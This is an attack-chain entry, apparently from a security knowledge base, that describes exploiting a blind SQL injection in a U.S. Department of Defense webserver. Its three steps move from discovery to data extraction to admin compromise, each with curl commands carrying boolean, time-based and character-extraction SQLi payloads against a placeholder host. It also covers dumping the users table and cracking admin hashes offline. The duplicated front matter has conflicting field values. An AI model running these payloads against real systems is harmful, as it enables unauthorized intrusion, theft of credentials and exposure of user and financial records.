---
id: ac-uuid-123
name: Blind SQL Injection Leading to Admin Account Compromise in DoD Webserver
tags:
  - sqli
  - blind-sqli
  - web-vulnerability
  - dod
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Discover-Blind-SQLi-Vulnerability]]'
  - '[[procedures/Exploit-Blind-SQLi-for-Data-Extraction]]'
  - '[[procedures/Compromise-Admin-Account-and-Access-Records]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:19.593Z'
description: >-
  A blind SQL injection vulnerability in a DoD webserver allows crafted URL
  requests to extract sensitive data, compromise admin accounts, and access user
  records.
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
---
id: ac-uuid-123
name: Blind SQL Injection Leading to Admin Account Compromise in DoD Webserver
type: attack_chain
description: A blind SQL injection vulnerability in a DoD webserver allows crafted URL requests to extract sensitive data, compromise admin accounts, and access user records.
verified: false
submitted: false
step_count: 3
created_at: 2023-10-01T00:00:00Z
updated_at: 2023-10-01T00:00:00Z
procedures: [[procedures/Discover-Blind-SQLi-Vulnerability]], [[procedures/Exploit-Blind-SQLi-for-Data-Extraction]], [[procedures/Compromise-Admin-Account-and-Access-Records]]
techniques: [[Exploit Public-Facing Application]]
tactics: [[Initial Access]], [[Collection]]
tags: sqli, blind-sqli, web-vulnerability, dod
platforms: Web
tools: []
---

# Blind SQL Injection Leading to Admin Account Compromise in DoD Webserver

Multi-stage attack chain demonstrating a complete attack workflow exploiting a blind SQL injection in a U.S. Department of Defense webserver to gain unauthorized access to sensitive financial information and user records.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~30 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Discovery] --> B[Exploitation]
    B --> C[Compromise]
    C --> D[Data Access]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Browser or proxy tool like Burp Suite for crafting requests

### Target Environment

- Web platform (DoD webserver)
- Required services/ports: HTTP/HTTPS on port 80/443
- Network access requirements: Public internet access to the webserver

### Initial Access Requirements

- No credentials required initially
- External network position
- No prior access needed

## Detailed Attack Procedures

### Step 1: Vulnerability Discovery
procedure: [[procedures/Discover-Blind-SQLi-Vulnerability]]

**Objective**: Identify the blind SQL injection vulnerability in the web application's URL parameter.

**Instructions**: Inspect the webserver's input parameters for signs of SQL injection by appending common payloads to URLs. Use a proxy to monitor requests and responses for anomalies like delays or conditional errors indicating blind SQLi.

For example, test with a basic boolean payload using [[commands/curl-boolean-test]]:

```bash
curl "https://target-dod-site.com/page?id=1' AND 1=1--"
```

Follow up with a time-based test using [[commands/curl-time-based-test]]:

```bash
curl "https://target-dod-site.com/page?id=1'; WAITFOR DELAY '0:0:5'--"
```

**Expected Output**: Normal response for true conditions, delays or errors for false/time-based, confirming blind SQLi without direct output.

**Success Indicators**:
- Response time differences or conditional behaviors observed
- No direct error messages, but inference possible via boolean or time delays

### Step 2: Data Extraction via Exploitation
procedure: [[procedures/Exploit-Blind-SQLi-for-Data-Extraction]]

**Objective**: Use the blind SQLi to extract sensitive financial information through iterative queries.

**Instructions**: Craft series of requests to extract data bit by bit using boolean or time-based techniques. Start with database name, then tables, and columns related to financial data.

Example boolean extraction for database version using [[commands/curl-boolean-extract]]:

```bash
curl "https://target-dod-site.com/page?id=1' AND ASCII(SUBSTRING((SELECT @@version),1,1))>64--"
```

Iterate by adjusting the comparison to binary search characters. For time-based, use SLEEP functions.

**Expected Output**: Inferred data from response patterns (e.g., page loads for true, errors for false).

**Success Indicators**:
- Successful inference of database schema or sample data
- Confirmation of access to financial-related tables

### Step 3: Admin Compromise and Record Access
procedure: [[procedures/Compromise-Admin-Account-and-Access-Records]]

**Objective**: Leverage the SQLi to bypass authentication, compromise admin account, and access all user records.

**Instructions**: Use extracted credentials or union-based if possible (though blind limits), or manipulate sessions via SQL updates. For blind, infer admin hashes and crack offline.

Example to dump user table using conditional extraction with [[commands/curl-dump-users]]:

```bash
curl "https://target-dod-site.com/page?id=1' AND (SELECT COUNT(*) FROM users)>0--"
```

Build queries to extract usernames/passwords iteratively.

**Expected Output**: Inferred admin credentials or direct access post-compromise.

**Success Indicators**:
- Admin login successful
- Access to all user records verified (limited to non-sensitive in demo)

## Attack Chain Summary

### Key Achievements

1. Identified blind SQLi in DoD webserver parameter
2. Extracted database schema and sensitive financial info potential
3. Compromised admin account and accessed user records

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Collection]]

---
*Last updated: 2023-10-01T00:00:00Z*
